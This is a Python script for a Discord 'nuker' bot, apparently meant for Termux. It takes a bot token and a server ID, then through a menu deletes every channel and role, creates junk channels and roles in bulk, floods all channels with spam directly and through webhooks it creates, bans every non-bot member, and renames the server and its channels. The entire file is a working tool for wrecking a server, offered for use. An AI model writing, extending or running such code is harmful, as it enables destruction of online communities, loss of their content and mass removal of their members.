import discord
import random
import asyncio
import os

# طلب التوكن ومعرف السيرفر
TOKEN = input("Enter your bot token: ")
guild_id = int(input("Enter server ID: "))

intents = discord.Intents.all()
client = discord.Client(intents=intents)

BANNER = """
               ██╗  ██╗ █████╗ ███████╗███████╗ █████╗ ███╗   ██╗
               ██║  ██║██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
               ███████║███████║███████╗███████╗███████║██╔██╗ ██║
               ██╔══██║██╔══██║╚════██║╚════██║██╔══██║██║╚██╗██║
               ██║  ██║██║  ██║███████║███████║██║  ██║██║ ╚████║
               ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
"""

MENU = """
              
              ╠════════════════════════╣
              ║ 1 - Full              ║
              ║ 2 - Delete channels   ║
              ║ 3 - Create channels   ║
              ║ 4 - Delete roles      ║
              ║ 5 - Create roles      ║
              ║ 6 - Spam via webhooks ║
              ║ 7 - Ban all           ║
              ║ 8 - Change server name║
              ║ 9 - Change server icon║
              ║10 - Rename all rooms  ║
              ╚════════════════════════╝
"""

def clear_console():
    os.system('clear')

async def delete_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*tasks)

async def create_channels(guild, count, names):
    tasks = [guild.create_text_channel(random.choice(names)) for _ in range(count)]
    await asyncio.gather(*tasks)

async def spam_message(guild, message):
    tasks = [channel.send(message) for channel in guild.text_channels for _ in range(20)]
    await asyncio.gather(*tasks)

async def delete_roles(guild):
    tasks = [role.delete() for role in guild.roles]
    await asyncio.gather(*tasks)

async def create_roles(guild):
    tasks = [guild.create_role(name=f"Role{random.randint(1, 1000)}") for _ in range(10)]
    await asyncio.gather(*tasks)

async def spam_via_webhooks(guild, message):
    tasks = []
    for channel in guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="Hassan")
            for _ in range(10):
                tasks.append(webhook.send(message))
        except Exception:
            pass
    await asyncio.gather(*tasks)

async def ban_all(guild):
    tasks = [member.ban() for member in guild.members if not member.bot]
    await asyncio.gather(*tasks)

async def change_server_name(guild, new_name):
    await guild.edit(name=new_name)

async def rename_all_channels(guild, new_name):
    tasks = [channel.edit(name=new_name) for channel in guild.channels]
    await asyncio.gather(*tasks)

@client.event
async def on_ready():
    clear_console()
    print("Servers:")
    for i, guild in enumerate(client.guilds):
        print(f"{i + 1} - {guild.name} ({guild.id})")

    guild = discord.utils.get(client.guilds, id=guild_id)

    if not guild:
        print("Server not found.")
        return

    while True:
        clear_console()
        print(BANNER)
        print(MENU)
        choice = input("Select: ")

        if choice == "1":
            await delete_channels(guild)
            count = int(input("New channels count: "))
            names = [input(f"{i + 1} Channel: ") for i in range(3)]
            await create_channels(guild, count, names)
            message = input("Spam message: ")
            await spam_message(guild, message)

        elif choice == "2":
            await delete_channels(guild)

        elif choice == "3":
            names = [input(f"{i + 1} Channel: ") for i in range(3)]
            await create_channels(guild, 10, names)

        elif choice == "4":
            await delete_roles(guild)

        elif choice == "5":
            await create_roles(guild)

        elif choice == "6":
            message = input("Spam message for webhooks: ")
            await spam_via_webhooks(guild, message)

        elif choice == "7":
            await ban_all(guild)

        elif choice == "8":
            new_name = input("Enter new server name: ")
            await change_server_name(guild, new_name)

        elif choice == "9":
            print("Changing server icon requires a local image file in Termux.")
        
        elif choice == "10":
            new_name = input("Enter new name for all channels: ")
            await rename_all_channels(guild, new_name)

client.run(TOKEN)
